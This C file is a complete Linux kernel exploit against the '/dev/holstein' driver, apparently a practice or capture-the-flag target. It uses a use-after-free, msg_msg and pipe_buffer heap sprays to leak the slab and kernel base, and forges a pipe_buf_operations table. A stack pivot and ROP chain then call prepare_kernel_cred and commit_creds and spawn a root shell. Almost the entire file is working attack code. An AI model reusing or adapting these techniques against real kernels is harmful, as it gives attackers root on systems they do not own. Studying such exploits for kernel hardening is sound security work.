#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define PAGE_SIZE   4096
#define OBJ_SIZE    1024

#define SPRAY       256

#define text        0xffffffff81000000
#define ops_offset  0xc11140

/* msg_msg helpers */
#define MSG_COPY    040000
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42

typedef struct {
    long mtype;
    char mtext[0];
} msg_t;

/* Pipe helpers */
struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

/* Device helpers */
int open_dev(void){
    return open("/dev/holstein", O_RDWR);
}

/* Backup registers */
uint64_t bak_cs, bak_rflags, bak_ss, bak_rsp;

void bak(){
	__asm__(
	".intel_syntax noprefix;"
        "mov bak_cs, cs;"
        "mov bak_ss, ss;"
        "mov bak_rsp, rsp;"
        "pushf;"
        "pop bak_rflags;"
        ".att_syntax;"		
	);
	puts("[+]Registers backed up");
}

/* Exploit */
void getshell(void){
    printf("[+] UID: %d\n", getuid());
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);
}

int main(void){
    int dev[2] = {0};
    int qid[SPRAY];
    int tmp_qid[SPRAY];
    int pfd[SPRAY][2];
    uint8_t data[OBJ_SIZE];
    struct pipe_buffer leak;
    uint64_t kbase = 0;
    uint64_t slab_leak = 0;
    uint64_t obj_addr = 0;
    uint8_t payload[OBJ_SIZE] = {0};
    struct pipe_buf_operations *fake_ops = NULL;
    uint64_t *rop = NULL;

    // Stack pivot + ROP gadgets
    uint64_t push_rsi_jmp_rsi_0x39 = 0xffffffff8132a2aa - text; // push rsi; jmp qword ptr [rsi + 0x39];
    uint64_t pop_rsp_ret = 0xffffffff810d55b5 - text; // pop rsp; ret;
    uint64_t add_rsp_0x68_pop3_ret = 0xffffffff811e209a - text; // add rsp, 0x68; pop r12; pop r13; pop rbp; ret;

    uint64_t pop_rdi_ret = 0xffffffff8114078a - text; // pop rdi; ret;
    uint64_t pop_rcx_ret = 0xffffffff810eb7e4 - text; // pop rcx; ret;
    uint64_t mov_rdi_rax_ret = 0xffffffff81638e9b - text; // mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;

    uint64_t prepare_kernel_cred = 0xffffffff81072560 - text;
    uint64_t commit_creds = 0xffffffff810723c0 - text;
    uint64_t kpti_trampoline = 0xffffffff81800e26 - text;

    // Save state
    bak();

    // Defrag kmalloc-1k
    msg_t *msg = calloc(1, sizeof(msg_t)+1024-0x30);
    for (int i = 0; i < SPRAY; i++){
        tmp_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(tmp_qid[i], msg, 1024-0x30, 0);
    }
    for (int i = SPRAY/2; i < SPRAY; i++){
        msgrcv(tmp_qid[i], msg, 1024-0x30, 0, 0);
    }

    // UAF - 2 fds but same obj (release 1 of them to free the obj)
    dev[0] = open_dev();
    dev[1] = open_dev();
    close(dev[0]);

    // Overlap with msg_msg
    for (int i = 0; i < SPRAY; i++){
        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(qid[i], msg, 1024-0x30, 0);
        msg->mtype = MTYPE_SECONDARY;
        msgsnd(qid[i], msg, 1024-0x30, 0);
    }

    // Leak kmalloc-1k
    memset(data, 0, OBJ_SIZE);
    read(dev[1], data, OBJ_SIZE);
    slab_leak = *(uint64_t *)data;
    obj_addr = slab_leak+0x400;
    printf("[+] kmalloc-1k SLAB @ %p\n", slab_leak);
    printf("[+] UAF obj @ %p\n", obj_addr);

    // Free msg_msg
    for (int i = 0; i < SPRAY; i++){
        msgrcv(qid[i], msg, 1024-0x30, 0, 0);
    }

    // Overlap with pipe_buffer
    for (int i = 0; i < SPRAY; i++){
        pipe(pfd[i]);
    }

    // Populate pipe_buffer
    for (int i = 0; i < SPRAY; i++){
        write(pfd[i][1], "pwn", 3);
    }

    // Leak KASLR
    memset(data, 0, OBJ_SIZE);
    read(dev[1], &leak, sizeof(struct pipe_buffer));
    kbase = leak.ops - ops_offset;
    printf("[+] pipe_buf->ops @ %p\n", leak.ops);
    printf("[+] KBASE @ %p\n", kbase);

    // Prepare fake pipe_buffer and fake ops table
    push_rsi_jmp_rsi_0x39 += kbase;
    memset(payload, 0, OBJ_SIZE);
    leak.ops = obj_addr+sizeof(struct pipe_buffer);
    memcpy(payload, &leak, sizeof(struct pipe_buffer));
    fake_ops = (struct pipe_buf_operations *)&payload[sizeof(struct pipe_buffer)];
    fake_ops->release = push_rsi_jmp_rsi_0x39;

    // Prepare stack pivot
    pop_rsp_ret += kbase;
    add_rsp_0x68_pop3_ret += kbase;

    *(uint64_t *)(payload+0x39) = pop_rsp_ret;
    *(uint64_t *)payload = add_rsp_0x68_pop3_ret;
    rop = (uint64_t *)(payload+0x88);

    // Prepare ROP
    pop_rdi_ret += kbase;
    pop_rcx_ret += kbase;
    mov_rdi_rax_ret += kbase;

    prepare_kernel_cred += kbase;
    commit_creds += kbase; 
    kpti_trampoline += kbase;

    *rop++ = pop_rdi_ret;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx_ret;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_ret;
    *rop++ = commit_creds;
    *rop++ = kpti_trampoline;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (uint64_t)&getshell;
    *rop++ = bak_cs;
    *rop++ = bak_rflags;
    *rop++ = bak_rsp;
    *rop++ = bak_ss;

    // Corrupt pipe_buffer
    write(dev[1], payload, OBJ_SIZE);
    // debug();

    // Release pipes
    for (int i = 0; i < SPRAY; i++) {
        close(pfd[i][0]);
        close(pfd[i][1]);
    }

    sleep(13371337);

    return 0;
}